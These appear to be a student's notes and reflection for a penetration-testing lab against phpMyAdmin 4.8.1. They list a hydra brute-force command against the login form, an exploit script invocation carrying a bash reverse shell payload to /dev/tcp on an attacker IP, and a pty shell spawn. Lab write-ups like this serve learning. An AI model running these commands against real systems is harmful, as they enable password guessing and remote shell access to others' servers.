New commands used:

Used hydra to try multiple password on phpmyadmin:
hydra -l gandalf -P gandalf_custom.txt 10.0.5.28 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:Cannot log in"

Upload reverse shell using exploit:
python3 50457.py 10.0.5.28 80 /phpmyadmin gandalf shallnotpass "bash -c  'exec bash -i >&/dev/tcp/10.0.17.27/4449 <&1'"

Spawn interactive shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'

Reflection on Lab 10.2
Challenges:
I was unsure about the exact exploit to use for phpMyAdmin version 4.8.1.
Using the correct parameters for the Hydra brute force attack took several attempts until identifying the accurate username/password combination.
Used provided hints to find the right phpMyAdmin vulnerability and suitable exploits.
Asked instuctor with help with reverse shell uploading and privilege escalation.
